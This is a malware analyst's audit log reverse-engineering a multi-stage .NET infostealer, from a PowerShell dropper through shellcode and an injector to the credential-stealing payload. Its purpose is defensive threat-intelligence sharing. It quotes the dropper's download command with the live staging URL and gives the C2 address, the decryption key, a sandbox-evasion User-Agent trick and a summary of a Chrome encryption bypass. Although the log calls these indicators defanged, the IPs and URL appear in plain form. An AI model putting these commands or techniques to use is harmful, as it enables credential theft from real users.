# Investigation Audit Log

**Case:** Multi-Stage .NET Infostealer
**Analyst:** manilka12
**Date:** June 2026

*Note: This is the raw technical audit log documenting the complete reverse-engineering process of the malware chain.*

---

## Phase 0: Initial Triage & Dropper (`hack2.txt`)
- **Initial Vector:** Recovered a suspicious file named `hack2.txt` from an infected machine.
- **Analysis:** It is a PowerShell script masquerading as a text file.
- **Behavior:** The script initiates a web request to download an image file:
  `Invoke-WebRequest -Uri "http://158.94.208.104/x7GkP2mQ9zL4/my_newest_ll.png"`
- **Execution:** Instead of saving the PNG, the script uses `Add-Type` to compile a C# class on the fly. It imports native Windows APIs (`VirtualAlloc`, `CreateThread`, `Marshal.Copy`) to allocate executable memory, copy the "PNG" directly into RAM, and execute it as a new thread. 
- **Conclusion:** The PNG is not an image; it is 53 KB of Donut Shellcode.

## Phase 1: Shellcode & Injector Module (`stage4.exe`)
- **Extraction:** The memory region allocated by `VirtualAlloc` was dumped to disk. The shellcode is obfuscated using the **Chaskey Block Cipher** (a lightweight encryption algorithm). Because standard decryption libraries did not support this specific implementation, the entire Chaskey core decryption module had to be manually rewritten in Python (`donut_decrypt.py`). By extracting the 16-byte key and nonce directly from the binary header, the custom Python script successfully decrypted the payload into a 64-bit Windows executable (`stage4.exe`).
- **Reversing `stage4.exe`:**
  - Dumped strings and analyzed the WinHTTP imports.
  - Found it targets `svchost.exe` and `powershell.exe` for process injection.
  - **Geo-Fencing Evasion:** The injector queries `HKCU\Control Panel\International\Geo\Name` to find the victim's country code. It checks for `RU` and `BY` (likely terminating to avoid infecting CIS machines).
  - **Anti-Sandbox HTTP Evasion:** When attempting to download the next stage, the C2 server (`158.94.208.104`) checks the HTTP `User-Agent`. If a standard browser string (e.g., Mozilla) or standard `curl` is used, the Apache server throws a `302 Found` and redirects to a massive 1.3 MB fake Cloudflare HTML page. 
  - **Bypass:** Analysis revealed that the injector spoofs its User-Agent using either the local country code (e.g., `US`) or the exact string `powershell`. By passing `User-Agent: powershell` via Python, the Cloudflare trap was bypassed, allowing the successful download of the true payload: `my_s.bin` (312 KB).

## Phase 2: Unpacking the Final Payload (`my_s_real.bin`)
- **Structure:** `my_s.bin` is a native wrapper that decrypts and loads a heavily obfuscated .NET assembly at offset `0x1ba40`.
- **Decompilation:** The .NET PE file was extracted and the MSIL was decompiled back into C# source code (`decompiled_code.cs`, ~15,000+ lines).
- **String Encryption:** The source code was heavily obfuscated. Every string (URLs, file paths, registry keys) was replaced by a method call pointing to a static class (e.g., `score8794.product625.flag6144.0e291526dfde...`).
- **Decryption & Key Extraction:** The class implements a custom AES decryption routine to decode strings at runtime. 
  - **How the Key Was Found:** By analyzing the decompiled C# code, the static constructor for the decryption class was located. Because the malware decrypts its strings on the fly, the AES key and IV had to be stored in the binary. The 256-bit AES key was found sitting in plain text as a hardcoded byte array inside the static constructor.
  - **Hardcoded AES Key:** `B025011E705D8869AE4F29F083465799465EE53648465ECA3E706AC49D7DA7DB`
  - Using this extracted key, a custom Python emulator (`string_decryptor.py`) was deployed to process the malware's decryption logic, successfully extracting all 127 encrypted strings from the binary.

## Phase 3: Capabilities & TTPs (Confirmed in Source)
With the strings decrypted and the source code audited, the true nature of the malware was exposed:

1. **True C2 Server Identified:** The malware abandons the staging IP and switches to its operational exfiltration server: `91.92.243.161:3038`.
2. **Registry Persistence (Line 968):** Contrary to typical "smash and grab" stealers, this variant imports `Microsoft.Win32.RegistryKey` and explicitly calls `Registry.LocalMachine.OpenSubKey` to embed itself into the Windows startup sequence.
3. **Analyst Evasion (Line 13274):** It actively hunts researchers. It calls `Process.GetProcesses()`, looping through active memory to search for and instantly `TerminateProcess` tools like Wireshark, x64dbg, or ProcessHacker.
4. **Infostealing Targets:** 
   - Browsers: `Login Data`, `Cookies`, `Local Extension Settings` (Firefox, Chrome, Edge, Brave).
   - Gaming: Steam (`config.vdf`, `loginusers.vdf`).
   - Comms: Telegram Desktop UWP.
5. **Chrome App-Bound Encryption Bypass:** Chrome 127 introduced App-Bound Encryption, which ties DPAPI decryption to the `chrome.exe` identity via the `elevation_service.exe` COM object. The malware bypasses this by utilizing **COM Spoofing**—interacting directly with the `IElevator` service to trick Windows into handing over the decrypted `Local State` key, unlocking all stored passwords.

## Conclusion
The investigation successfully mapped the entire attack chain from the initial PowerShell stager to the final .NET memory payload. The C2 infrastructure, evasion techniques, AES decryption keys, and Chrome COM bypass mechanisms have been fully documented and defanged for community sharing.
